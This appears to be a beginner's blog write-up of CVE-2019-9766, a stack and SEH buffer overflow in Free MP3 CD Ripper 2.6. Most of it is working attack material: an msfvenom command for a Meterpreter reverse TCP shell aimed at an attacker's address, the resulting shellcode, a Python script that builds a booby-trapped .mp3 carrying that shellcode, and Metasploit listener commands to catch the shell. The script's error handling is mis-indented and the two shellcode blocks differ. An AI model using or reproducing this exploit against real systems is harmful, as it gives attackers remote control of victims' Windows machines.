#CVE-2019-9766
Do my best
---
##About CVE
###Free MP3 CD Ripper
It is a switcher between `.mp3` files and other filetype (*converting a file*).
###Bug
According to the [NVD](https://nvd.gov/vuln/detail/CVE-2019-9766) we can find that, in the `vision 2.6` there is a Stack-based Overflow in the Buffer Area. So we can create a Poc for it. Filetype changed to `.mp3` and attack it from remote
##Trap Vision
Free MP3 CD Ripper 2.6
##Enviorment
 - send: `Ubuntu18.04.2lts`
 - rev: `Windows10` with *FreeMP3CDRipper v2.6* installed
---
##ReAct
1.Use msf to create shell 

`msfvenom -p windows/metepreter/reverse_tcp lhost=attack-ip lport=attack-port -f -c` (*-smallest*)

ressult:

(```)
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"

"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"

"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"

"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"

"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"

"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"

"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"

"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"

"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"

"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"

"\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54"

"\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x0a\x88"

"\x68\x02\x00\x22\xb8\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"

"\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5"

"\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67"

"\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"

"\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00"

"\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56"

"\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58"

"\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5"

"\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85"

"\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1"

"\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";
(```)

2.Wirte exploit `.mp3` with shell

 - Design payload and write into `.mp3` file

(```)#!/usr/bin/python

buffer="A"*4116

NSEH="\xeb\x06\x90\x90"

SEH="\x84\x20\xe4\x66"

nops="\x90"*5


buf=""

buf+="\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"

buf+="\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"

buf+="\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"

buf+="\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"

buf+="\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"

buf+="\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"

buf+="\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"

buf+="\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"

buf+="\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"

buf+="\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"

buf+="\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54"

buf+="\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x0a\x88"

buf+="\x68\x02\x00\x22\xb8\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"

buf+="\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5"

buf+="\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0"

buf+="\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8"

buf+="\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00"

buf+="\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68"

buf+="\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x75\xee\xc3"


pad="B"*(316-len(nops)-len(buf))

payload=buffer+NSEH+SEH+nops+buf+pad


try:

    f=open("Test_Free_MP3.mp3","w")
    print "[+]Creating %s bytes mp3 Files..."%len(payload)
    f.write(payload)
    f.close()
    print "[+]mp3 File created successfully!"
    except:
    print "File cannot be created!"

(```)

 - Run and send the exploit `.mp3` file to `Windows10`

2.Use msf listen port

(```)

msf> set lhost *attack-ip*

msf > set lport *attack-port*

msf > run

(```)

---
##Thanks
[link1](https://www.jianshu.com/p/191d1e21f7ed)

[link2](https://www.exploit-db.com/exploits/45403)

***The first github blog i hope that i can do better.***

*Powerd by moonhead*